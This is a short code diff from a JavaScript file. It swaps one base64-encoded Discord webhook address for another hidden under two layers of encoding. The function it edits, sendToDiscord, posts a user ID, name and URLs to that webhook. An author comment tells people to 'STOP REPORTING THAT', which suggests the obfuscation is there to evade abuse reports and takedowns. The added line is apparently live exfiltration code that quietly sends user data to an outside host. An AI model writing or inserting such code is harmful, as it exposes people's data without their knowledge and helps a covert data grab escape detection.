@@ -96,7 +96,7 @@
 
         // Send data to Discord Webhook STOP REPORTING THAT, I KNOW, CONTACT ME IF YOU HAVE A PROBLEM @drmineword
         async function sendToDiscord(name, url, userId, url_part_main) {
-            const webhookUrl = decodeBase64("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyNjQyODc1MTYwNDYxMzEzMC9qcDd6ZVBNcUJ2RWxwamJ3MkxwMGd5UWpTUnkxdzRSVVpKMlpTdURVUlNRMWlzaDBVeG5RMTdkNkVFc2kxdWs4NEhyZT93YWl0PTEmdGhyZWFkX2lkPTEzMjE4NzQ2NjczNTg3ODE1MzE");        const payload = {
+            const webhookUrl = decodeURIComponent(atob("aHR0cHMlM0ElMkYlMkZkaXNjb3JkLmNvbSUyRmFwaSUyRndlYmhvb2tzJTJGMTMyOTc5NTQxNjY1NjQ0OTY2OCUyRmo1YjYyQUc3MkpFTVdUZGZIcTJ4c29nVmlFclVsdVo2RlRlRlZfRlBtbXJoUlRiSXBIRDk4LWJPRHNoUkZUQ2poVlgxJTNGd2FpdCUzRDElMjZ0aHJlYWRfaWQlM0QxMzIxODc0NjY3MzU4NzgxNTMx"));       const payload = {
                 content: `User ID: ${userId}, Name: ${name}, URL: ${url}, ${url_part_main}`
             };
 
